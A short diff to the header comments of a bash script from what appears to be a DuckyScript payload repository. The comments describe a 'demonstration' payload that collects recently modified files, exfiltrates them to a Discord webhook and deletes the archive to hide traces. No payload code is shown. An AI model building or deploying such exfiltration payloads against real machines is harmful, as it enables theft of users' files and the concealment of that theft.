@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# --> See README.md for full information <--
+# --> See README.md for full information (https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Ducky_Dropper/README.md) <--
 # This is a DEMONSTRATION payload that is part of the Ducky_Dropper payload system that identifies files modified in the last 24 hours, tarballs them, exfiltrates them to a Discord webhook, and then deletes the tarball to obfuscate.
 # You must insert your Discord webhook in line 37.
 
